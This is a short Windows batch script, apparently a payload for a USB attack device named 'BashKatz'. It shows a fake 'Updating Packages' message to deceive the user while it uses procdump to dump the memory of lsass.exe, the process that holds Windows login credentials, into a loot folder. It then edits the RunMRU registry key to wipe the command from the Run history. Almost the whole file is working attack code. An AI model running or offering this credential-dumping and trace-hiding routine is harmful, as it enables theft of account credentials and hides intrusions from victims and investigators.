@echo off
REM Script written by: robemmerson
setlocal
cls

REM Go to dump directory
cd /d %~dp0
cd ../../loot/BashKatz

REM Update Message
echo.
echo Updating Packages, Please Wait...

REM Check whether Windows is x86 or x64 and run the appropiate version of procdump
reg query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL || set x64=64
"..\..\payloads\%1\procdump%x64%.exe" -accepteula -ma lsass.exe %computername%.dmp >nul 2>&1

REM Clean up the 'Run' list
for /f "tokens=3 delims= " %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v "MRUList" ^| find /i "REG_SZ"') do @set mru=%%a
set newmru=%mru:~1%
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v "MRUList" /d %newmru% /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v %mru:~0,1% /f >nul 2>&1